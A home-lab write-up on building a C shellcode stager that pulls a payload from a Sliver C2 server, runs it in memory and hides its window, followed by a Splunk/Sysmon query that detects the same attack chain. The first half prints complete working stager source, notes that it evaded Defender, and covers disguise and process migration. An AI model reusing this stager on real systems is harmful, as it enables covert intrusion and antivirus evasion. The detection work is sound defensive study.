# AttAck__DetEct-1
---
### In this lab, I built a simple malware stager in C that doesn’t carry the full payload, but instead pulls shellcode from my C2 server and runs it directly in memory. After that, the shellcode takes over and gives a reverse shell back to the C2. The interesting part isn’t “making malware” — it’s how I caught my own malware using Sysmon logs and Splunk, even when `Windows Defender didn’t flag it`. This writeup walks through what the stager does, how the shell happened, and how I detected and mapped the activity using Splunk.
---
## 1. How this stager actually works

This small C program does one job:

- downloads shellcode from a Sliver C2
- loads it directly into memory
- executes it
- then the shellcode handles the reverse shell

So this file is not the real payload — it is just the delivery component.


### Full Source Code

```c
#include <windows.h>
#include <wininet.h>
#include <stdio.h>

#pragma comment(lib, "wininet.lib")

void DownloadAndExecute() {
    HINTERNET hInternet = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    HINTERNET hConnect = InternetOpenUrlA(hInternet, "http://10.0.3.11:1234/asmogosmo.woff", NULL, 0, INTERNET_FLAG_RELOAD, 0);

    DWORD bytesRead;
    BYTE tempBuffer[4096];
    BYTE* shellcode = NULL;
    DWORD totalSize = 0;

    while (InternetReadFile(hConnect, tempBuffer, sizeof(tempBuffer), &bytesRead) && bytesRead > 0) {
        shellcode = (BYTE*)realloc(shellcode, totalSize + bytesRead);
        memcpy(shellcode + totalSize, tempBuffer, bytesRead);
        totalSize += bytesRead;
    }

    LPVOID addr = VirtualAlloc(NULL, totalSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    RtlMoveMemory(addr, shellcode, totalSize);

    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)addr, NULL, 0, NULL);
    WaitForSingleObject(hThread, INFINITE);

    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);
    free(shellcode);
}

int main() {
    HWND hWnd = GetConsoleWindow();
    ShowWindow(hWnd, SW_HIDE);
    DownloadAndExecute();
    return 0;
}
```


### Opening an Internet Connection

```c
HINTERNET hInternet = InternetOpenA("Mozilla/5.0", ...);
HINTERNET hConnect = InternetOpenUrlA(hInternet, "http://10.0.3.11:1234/asmogosmo.woff", ...);
```

In simple terms:

- the program requests internet access
- it uses a browser-like user agent string
- it connects to the given URL and downloads data

##### The .woff file format is subjected to how Sliver C2 respond with shellcode to the stagers


### Downloading the Shellcode into Memory

Download loop:

```c
while (InternetReadFile(hConnect, tempBuffer, sizeof(tempBuffer), &bytesRead) && bytesRead > 0) {
    shellcode = (BYTE*)realloc(shellcode, totalSize + bytesRead);
    memcpy(shellcode + totalSize, tempBuffer, bytesRead);
    totalSize += bytesRead;
}
```

Explanation :

- the file is read from the server in chunks
- the buffer is dynamically expanded using `realloc`
- chunks are appended one after another
- at the end, the complete shellcode exists only in RAM

### Allocating Executable Memory

```c
LPVOID addr = VirtualAlloc(NULL, totalSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
```

This allocates memory that is:

- writable
- executable

This is uncommon in normal applications and is often monitored by security tools, but somehow this stager broke the fence !


## Copying Shellcode into Executable Memory

```c
RtlMoveMemory(addr, shellcode, totalSize);
```

This copies the downloaded bytes into the allocated executable memory region.


### Executing the Shellcode

```c
HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)addr, NULL, 0, NULL);
WaitForSingleObject(hThread, INFINITE);
```

Here:

- a new thread is created
- execution starts at the address of the shellcode
- the program waits for that thread to finish


## Hiding the Console Window

```c
HWND hWnd = GetConsoleWindow();
ShowWindow(hWnd, SW_HIDE);
```

This hides the console window so no black terminal window appears on the screen which make weird at the Victim Machine.

#### Compiled the Stager C Code in Linux using MinGW to generate a Windows executable. I also attached a custom icon to the executable so it doesn’t just look SUS. Nothing fancy here about the build process — just a normal cross-compile setup to produce a Windows Executable from Linux
---
### Consider this as an assumed phishing scenario where the victim has fallen for the bait.

![Architecture Diagram](https://github.com/b-monesh/AttAck__DetEct-1/blob/main/1.png)

Microsoft Defender may fail to recognize a sample if it has no known signature or reputation yet. Low-prevalence, newly compiled binaries sometimes aren’t flagged immediately by cloud intelligence systems. If the program doesn’t clearly show malicious behavior during static or brief runtime analysis, it may not trigger alerts.

![Architecture Diagram](https://github.com/b-monesh/AttAck__DetEct-1/blob/main/2.png.png)

---

## 2. Reverse Shell

*Sliver* is an open-source command-and-control framework commonly used in red-team and adversary simulation exercises. It allows security teams to emulate attacker behaviors like command channel creation , payload delivery, and post-exploitation actions.

Their Documentation provides awesome content on understanding and using their tool [Sliver Docs](https://sliver.sh/docs)

### Getting Reverse Shell

![Architecture Diagram](https://github.com/b-monesh/AttAck__DetEct-1/blob/main/3.png)

### On Successfull Execution of the PE on the victim side we get the session Established

![Architecture Diagram](https://github.com/b-monesh/AttAck__DetEct-1/blob/main/4.png)

### From an attacker’s perspective, stealth is improved by migrating from their original process into another legitimate one. When the attacker has only user level privileges, explorer.exe is one of the most commonly targeted processes for migration.

![Architecture Diagram](https://github.com/b-monesh/AttAck__DetEct-1/blob/main/5.png)
![Architecture Diagram](https://github.com/b-monesh/AttAck__DetEct-1/blob/main/6.png)

--- 
## 3. Detection Using sysmon logs with Splunk SPL (Search Processing Language)

After running the payload, I didn’t just stop at “yeah, reverse shell achieved.” The main goal of this lab was actually to detect my own malware activity using logs. So I pulled everything into Splunk and started hunting through Sysmon data.

Understanding the workflow of the attack really helped me build the SPL query (yes, definitely with help from an LLM), but I tuned it to fit exactly what I wanted.

```c
index="pc-01_sysmon"  EventCode=11 TargetFilename="C:\\Users\\*" 
| rename TargetFilename as file 
| eval file = replace(file, ":[^\\\\]+$", "")

| join file

[ 
search index="pc-01_sysmon" EventCode=1 
| rename Image as file 
| fields ComputerName file ParentImage ParentProcessId ProcessId CommandLine 
] 

|  join file

[
search index="pc-01_sysmon" EventCode=3
    | rename Image as file 
    | rename DestinationIp as C2_Server
 | fields file C2_Server
]
|  join file

[
search index="pc-01_sysmon" EventCode=8
    | rename SourceImage as file 
    | rename TargetImage as MigratedProcess
 | fields file MigratedProcess
]


|  join MigratedProcess

[
search index="pc-01_sysmon" EventCode=1 Image="*\\powershell.exe" OR Image="*\\cmd.exe"
    | rename ParentImage as MigratedProcess 
    | rename ProcessId as ImageId
 | fields MigratedProcess Image ImageId
]

| rename file as Malicious_file
| table ComputerName Malicious_file ParentImage CommandLine ProcessId ParentProcessId C2_Server MigratedProcess Image ImageId
```
### Main Sysmon Events

> #### Event ID 11 – File Create  
> this showed my malware getting created under C:\Users\...
>
> #### Event ID 1 – Process Create  
> confirmed the file actually executed
>
> #### Event ID 3 – Network Connection  
> clearly showed the connection going out to the C2 server
>
> #### Event ID 8 – CreateRemoteThread  
> this is the key one for detecting process migration / injection




![Architecture Diagram](https://github.com/b-monesh/AttAck__DetEct-1/blob/main/9.png)
![Architecture Diagram](https://github.com/b-monesh/AttAck__DetEct-1/blob/main/10.png)


### Attack Story

Using these, I basically stitched the full attack story:

- malware landed
- it executed
- it reached out to the C2
- it migrated into another process
- from there, cmd or PowerShell was spawned for attacker interaction


My SPL joins these events together and puts them into a single table so the whole chain is visible instead of scattered logs everywhere.

I also pulled the Process ID of spawned PowerShell/cmd, which is useful to later track attacker commands executed inside that session.


So this detection wasn’t magic — it was simply:

- knowing the attack flow
- picking the right Sysmon events
- joining and visualizing them properly

# And that’s how I caught my Stager malware that Defender missed !

## `Warning: these techniques can be misused. Use them only in controlled labs with proper authorization.`
